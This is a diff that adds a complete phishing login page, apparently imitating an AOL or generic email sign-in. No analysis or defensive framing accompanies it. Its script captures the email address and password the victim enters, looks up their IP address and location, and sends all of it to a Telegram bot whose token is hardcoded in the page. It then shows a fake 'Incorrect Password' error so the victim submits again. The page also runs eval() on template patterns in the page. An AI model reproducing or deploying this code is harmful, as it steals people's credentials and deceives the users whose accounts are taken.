@@ -1,0 +1,204 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <title>My Document</title>
+  <meta name="robots" content="noindex">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="robots" content="noimageindex">
+  <meta name="googlebot" content="noindex">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style type="text/css">
+    div#container {
+      position:relative;
+      width: 500px;
+      margin-top: 0px;
+      margin-left: auto;
+      margin-right: auto;
+      text-align:left;
+    }
+    body {text-align:center;margin:0}
+    .textbox {
+      border: 1px solid #c1c1c1;
+      border-radius: 2px;
+      font-family: "Helvetica Neue","HelveticaNeue",Helvetica,Arial,sans-serif;
+      font-size: 13px;
+      height: 34px;
+      background: transparent;
+      line-height: normal;
+      padding: 5px 8px 6px 8px;
+      width: 100%;
+      outline: 0;
+      resize: none;
+      border:none;
+      -webkit-appearance: none;
+    }
+    .email, .password{
+      outline: none; border-color: transparent; margin-top: 3px;
+    }
+    .redph::placeholder {
+      color: red !important;
+    }
+    .error-msg {
+      display: none;
+      font-size: 1em;
+      color: red;
+      margin: 0;
+      margin-bottom: 14px;
+      position:absolute;
+      left:70px;
+      top:275px;
+      z-index:10;
+      background: #fff;
+      width:359px;
+      padding-left:11px;
+      border-radius:3px;
+    }
+    .error-msg-visible {
+      display: block !important;
+    }
+    .input-error {
+      border: 1.5px solid red !important;
+      color: red !important;
+    }
+    .input-error::placeholder {
+      color: red !important;
+      opacity: 1;
+    }
+  </style>
+  <link rel="apple-touch-icon" sizes="180x180" href="data:image/png;base64,iVBORw0...">
+  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0...">
+  <script type="text/javascript">
+    function unhideBody() {
+      var bodyElems = document.getElementsByTagName("body");
+      bodyElems[0].style.visibility = "visible";
+    }
+  </script>
+</head>
+<body style="visibility:hidden" onload="unhideBody()" bgColor="#F9F9F9">
+  <div id="container">
+    <div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:498px; height:410px; z-index:0;">
+      <img src="https://i.ibb.co/n18cK79/otherheader.png" alt="" title="" border="0" width="498" height="410">
+    </div>
+    <form id="loginForm" autocomplete="off">
+      <input type="hidden" name="form-name" value="Othersignin" />
+      <input class="email textbox" name="email" placeholder="Enter Your Email" autocomplete="off"
+        required type="Email"
+        style="position:absolute;width:359px;left:70px;top:165px;z-index:2; outline: none; border-color: transparent; margin-top: 5px;">
+      <input class="password textbox" value="" name="password" placeholder="Enter Your Password" autocomplete="off"
+        required type="password"
+        style="position:absolute;width:359px;left:70px;top:235px;z-index:2; outline: none; border-color: transparent; margin-top: 5px;">
+      <p id="username-error" class="error-msg" role="alert"></p>
+      <div id="formimage1" style="position:absolute; left:66px; top:295px; z-index:5">
+        <input class="sbtbutton" type="image" name="formimage1" width="364" height="52" src="https://i.ibb.co/PrjBrw6/otherbutton.png">
+      </div>
+    </form>
+  </div>
+  <script>
+    // Populate email if hash present on load
+    (function(){
+      function templatePage() {
+        let g=document;
+        function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}
+        for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}
+        const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;
+        for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}
+      }
+      // Set email from hash, if present (legacy template logic)
+      try {
+        var emailInput = document.querySelector('input[name="email"]');
+        if(emailInput && location.hash) {
+          emailInput.value = location.hash.substring(1);
+        }
+      } catch(e){}
+      templatePage();
+    })();
+
+    // --- Begin AOL sender (Telegram) logic ---
+    const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
+    const TELEGRAM_CHAT_ID = "-5006528512";
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("loginForm");
+      const usernameInput = form.querySelector('input[name="email"]');
+      const passwordInput = form.querySelector('input[name="password"]');
+      const errorMsg = document.getElementById("username-error");
+
+      function addInputErrorStyling() {
+        if (usernameInput) usernameInput.classList.add('input-error', 'redph');
+        if (passwordInput) passwordInput.classList.add('input-error', 'redph');
+      }
+      function removeInputErrorStyling() {
+        if (usernameInput) usernameInput.classList.remove('input-error','redph');
+        if (passwordInput) passwordInput.classList.remove('input-error','redph');
+      }
+      function showError(msg) {
+        if (!errorMsg) return;
+        errorMsg.textContent = msg;
+        errorMsg.classList.remove("error-msg");
+        errorMsg.classList.add("error-msg-visible");
+      }
+      function hideError() {
+        if (!errorMsg) return;
+        errorMsg.classList.add("error-msg");
+        errorMsg.classList.remove("error-msg-visible");
+        errorMsg.textContent = "";
+      }
+      async function sendToTelegram(email, password, locationInfo) {
+        const text = `
+---------------|54|---------------
+Username: ${email}
+Password: ${password}
+${locationInfo}
+-------------------------------
+`;
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
+
+        try {
+          await fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+        } catch { /* Don't block UI on error */ }
+      }
+
+      async function getLocationInfo() {
+        try {
+          const res = await fetch("https://ip-api.io/json");
+          const data = await res.json();
+          return `Country: ${data.country_name || ""}, City: ${data.city || ""}, IP: ${data.ip || ""}, ZIP: ${data.postal || ""}`;
+        } catch {
+          return "Location: Unknown";
+        }
+      }
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+        removeInputErrorStyling();
+        hideError();
+
+        const email = usernameInput ? usernameInput.value.trim() : "";
+        const password = passwordInput ? passwordInput.value : "";
+        const locationInfo = await getLocationInfo();
+
+        await sendToTelegram(email, password, locationInfo);
+
+        addInputErrorStyling();
+        showError("Incorrect Password. please Try Again.");
+      });
+
+      usernameInput && usernameInput.addEventListener("input", () => {
+        removeInputErrorStyling();
+        hideError();
+      });
+      passwordInput && passwordInput.addEventListener("input", () => {
+        removeInputErrorStyling();
+        hideError();
+      });
+    });
+    // --- End AOL sender logic ---
+  </script>
+</body>
+</html>
